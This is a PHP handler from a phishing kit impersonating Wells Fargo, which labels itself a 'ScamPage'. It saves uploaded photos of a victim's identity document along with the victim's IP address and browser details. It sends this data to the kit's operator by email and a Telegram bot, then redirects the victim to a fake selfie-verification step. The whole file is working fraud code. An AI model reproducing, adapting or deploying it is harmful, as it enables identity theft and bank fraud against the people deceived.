<?php

	ob_start();
session_start();
include '../Inc/config.php';

	if(isset($_POST['img_submit'])){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
	$actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

	$img_name=$_FILES['file2']['name'];
	$tmp_img_name=$_FILES['file2']['tmp_name'];
	$dir='../results/uploads/';
	$dirr= "/" .$dir. "" .$img_name. "" ;
	$dirf= trim(str_replace('../','',$dirr));
	$actual_link1 = trim(str_replace('/processing/indentity.php','',$actual_link));
	move_uploaded_file($tmp_img_name,$dir.$img_name);
	
	$img_name2=$_FILES['file3']['name'];
	$tmp_img_name2=$_FILES['file3']['tmp_name'];
	$dir='../results/uploads/';
	$dir1= "/" .$dir. "" .$img_name2. "" ;
	$dir2= trim(str_replace('../','',$dir1));
	$actual_link1 = trim(str_replace('/processing/indentity.php','',$actual_link));
	move_uploaded_file($tmp_img_name2,$dir.$img_name2);



$data = "»»————-　★[ ⚫️🌀 WELLSFARGO Indentity ⚫️🌀 ]★　————-««\r\n";
$data.= " | Identity Front : $actual_link1$dirf \r\n";
$data.= " | Identity Back : $actual_link1$dir2 \r\n";
$data.= "»»————-　★[ 💻🌏 DEVICE INFO 🌏💻 ]★　————-««\r\n";
$data.= "[IP]         : $ip \r\n";
$data.= "[IP lookup]  : http://ip-api.com/json/$ip \r\n";
$data.= "[User Agent] : $useragent \r\n";
$data.= "»»————-　★[ ⚫️🌀 WELLSFARGO ScamPage B⚫️🌀 ]★　————-««\r\n";


		if ($sendtoemail=="yes"){
		$subject = "💼 WELLSFARGO Indentity 💼  From $ip";
        $headers = "From: 🍁WELLSFARGO Indentity🍁 <newfullz@sh33nz0.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($email,$subject,$data,$headers);
		}


	if ($sendtotelegram=="yes"){
	$txt = $data;
    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
	}
	

        header("Location: ../pic2?oamo/identity/_SELFIE_INDENTITY_PAGE&token=cjmvJprW2Dw1/recognizeUser/identification");
        exit();

	}
else
	{
		header("Location: ../index.php");
		exit();
	}

?>
